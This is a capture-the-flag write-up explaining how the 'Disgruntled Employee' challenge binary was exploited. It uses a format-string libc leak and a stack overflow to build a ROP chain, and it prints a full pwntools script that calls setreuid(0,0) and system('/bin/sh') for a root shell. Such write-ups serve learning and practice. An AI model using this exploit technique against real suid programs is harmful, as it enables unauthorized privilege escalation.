# Disgruntled Employee [+Hard]
![](https://img.shields.io/badge/category-pwn4-blue)

This writeup is made up from a combination of the author's insights as well as
Larry's actual solution. Both versions contained the same description and first
steps of solution. The binaries were slightly different, but offsets to and
from libc remained the same. The description follows, making it clear we need
to read the flag.txt file.

> A disgruntled employee was recently fired but has managed to regain access to
> the server. They left some 'flag.txt' file, but we're too scared to read it.
> Can you do it for us?

Running `checksec` on the provided binary, we find the following security settings:
```
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
```
From this we gather that the stack isn't executable (NX) so were we to overflow
it we can't just run shellcode, but no canary exists so if there is an
overflow, we can write data do it without causing the program to exit.

Running the provided binary (`./de`) shows a cute graphic with the same
description and a menu prompt:

```
-=[ Product Management System ]=-
[1] Add Product
[2] Print Product List
[3] Exit
Choose option:
```

Taking a look at the disassembly in Radare2 and playing around a bit, we can
find a buffer overflow in the `Name` property where 512 bytes of input can be
written to a buffer of 64 bytes (on the stack):

```
sym.addProduct ();
     ; var char *src @ rbp-0x40

0x0000127e      488d45c0       lea rax, [src]
0x00001282      be00020000     mov esi, 0x200      ; int size
0x00001287      4889c7         mov rdi, rax        ; char *s
0x0000128a      e801feffff     call sym.imp.fgets  ;[5] ; char *fgets(char *s, int size, FILE *stream)
```

Some careful examination of what characters are **actually** (unlike what the
error message proclaims) disallowed from the SKU, we find that `p`[^1], all
uppercase letters and `%` are allowed. This leads to an *exploitable* format
string vulnerability in the `SKU` property which can be seen if we add a
product with an SKU of `%A %A`.

[^1]: This doesn't serve any purpose in a solution but may have helped if
  someone instinctively tried %p.

**Note**: `%A` prints "Hexadecimal floating point, uppercase" which just so
happens (:tm:), with this libc, to give an address inside of libc.

```
Products:
Name: test
SKU: 0X0.000000000000FP-1022 0X0.07F62FD3ED6AP-1022
```

Looking at the memory maps of the process during a run, we find that this
address (`0x7f62fd3ed6a`) is offset from libc by `0x1ec6a0`. From here, finding
offsets to useful gadgets can be done in a variety of ways (Radare2,
one_gadget, pwntools, the libc binary). Below is one set of gadgets that work
(libc being the address returned from printing the products and subtracting
`0x1ec6a0`):
```
   ret = libc + 153209   # ret;          -> return to next instruction
   pop = libc + 158578   # pop rdi; ret; -> clear rdi
    sh = libc + 1799594  # "/bin/sh"     -> insert "/bin/sh" into rdi
system = libc + 349200   # system()      -> call system("bin/sh")
```

From here, all we need to do is send over the 64 bytes to fill the buffer, 16
more as padding, and then our paylod of `<ret> + <pop> + <sh> + <system>` to
call `system("/bin/sh")`. Typing `cat flag.txt` here gives us the flag:

`CTF{W3_4Ll_l0v3_F0rM47_57r1N65_4Nd_r0P_cH41N5}`

What's the difference for (Hard)? Well, if we pay attention carefully, we see
that the original binary we're running after we ssh to the remote server has
the set user ID (suid) bit set. This set the effective user ID (euid) to that
of root. Inside the binary, there's a call to `setresgid` which also sets the
real user ID (ruid) to that of root (technically euid and sgid too). The call
to `/bin/sh` then runs the shell as root and lets the user read the root-owned
flag file.

However, for the (Hard) binary, there isn't a call to `setresgid`, so while the
euid is set to 0 (root), the ruid isn't! `/bin/sh` checks that when it's run,
realizes they're different, and drops privileges, preventing us from reading
the flag. The solution? Set it ourselves of course. Larry did this with
`setreuid(0, 0)` which sets ruid and euid, located at an offset of `1145520`.
Below is his solution using pwntools, with some changes for clarity:

```py
from pwn import *

p = process('./de', env={'LD_LIBRARY_PATH': '.', 'LD_PRELOAD': './libc.so.6'})

libc_so = ELF('./libc.so.6')

### Leak libc ###
# Add Product
p.recvuntil(':')
p.sendline('1')
p.recvuntil(':')
p.sendline('<libc_leak>')
p.recvuntil(':')
p.sendline('%A %A ')
p.recvuntil(':')

# Print products
p.sendline('2')
p.recvuntil('SKU: ')
p.recvuntil(' ')

libc = int(p.recvuntil(' ').decode().replace('0X0.0', '').replace('P-1022 ', '0'), 16) - 1603728 - 413200

ret = libc + 153209 # ret;
pop = libc + 158578 # pop rdi; ret;
sh = libc + 1799594 # "/bin/sh"
setreuid = libc + libc_so.sym['setreuid']
system = libc + libc_so.sym['system']

p.recvuntil('.')
p.sendline()

### PWN ###
p.sendline('1')
p.recvuntil(':')
p.sendline(b'A' * 72 + p64(ret) + p64(pop) + p64(0) + p64(setreuid) + p64(ret) + p64(pop) + p64(sh) + p64(system))
p.recvuntil(':')
p.sendline('1')

p.interactive()
```

Hard flag: `CTF{W3_4Ll_l0v3_F0rM47_57r1N65_4Nd_H4RD_r0P_cH41N5}`

---

I'd like to apolgize for the early bugs with being able to send your input to
the remote server: there wasn't enough testing before the CTF went live. But
hey, that's also what led to the second version! I hope you enjoyed the
challenge and writeup, as delayed as the latter was.
